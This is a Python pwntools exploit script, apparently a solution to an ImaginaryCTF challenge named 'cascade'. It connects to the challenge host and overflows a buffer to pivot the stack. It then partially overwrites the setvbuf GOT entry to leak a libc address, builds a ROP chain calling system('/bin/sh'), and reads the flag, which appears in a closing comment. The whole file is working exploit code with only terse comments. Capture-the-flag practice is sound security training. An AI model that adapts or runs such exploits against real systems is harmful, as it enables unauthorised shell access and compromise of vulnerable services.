#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
# read
b *0x401173
'''

#for i in range(1):
while(True):
	try:
		p = remote("cascade.chal.imaginaryctf.org", 1337)
		p.recvline()
		#p = process('./vuln_patched')
		#p = gdb.debug('./vuln_patched', gdbscript = script)

		main = 0x401162
		leakmain = 0x401183
		read_got = exe.got['read']
		setvbuf_got = exe.got['setvbuf']
		leave_ret = 0x401179

		# pivot things
		payload = b"0" * 0x40
		payload += p64(0x404030 + 0x40) + p64(main)
		s(payload)
		sleep(0.5)

		# overwrite stdin in binary and prepare a rop after partial overwrite (DO NOT TOUCH STDOUT in order to leak)
		payload = p64(setvbuf_got) + p64(0)
		payload += b"1" * 8 + p64(0x404130)
		payload += p64(leave_ret) + b"1" * 8
		payload = payload.ljust(0x40, b"1")
		payload += p64(setvbuf_got + 0x40) + p64(main)
		payload = payload.ljust(0x100, b"1")
		payload += p64(0x404800 + 0x40) + p64(leakmain)
		s(payload)
		sleep(0.5)

		# partial overwrite setvbuf to puts
		payload = p16(0x8be0)
		s(payload)
		sleep(0.5)

		dummy = p.recvline()
		libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
		lleak("libc_base", libc_base)

		break

	except:
		try:
			p.close()
		except:
			pass

#debug()
# pivot the rsp to higher
payload = b"4" * 0x40 + p64(0x404a00 + 0x40) + p64(main)
s(payload)
sleep(0.5)

system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
payload = b"5" * 0x40
payload += p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
s(payload)
sleep(0.5)

sl(b"cat flag.txt")

p.interactive()
#ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}
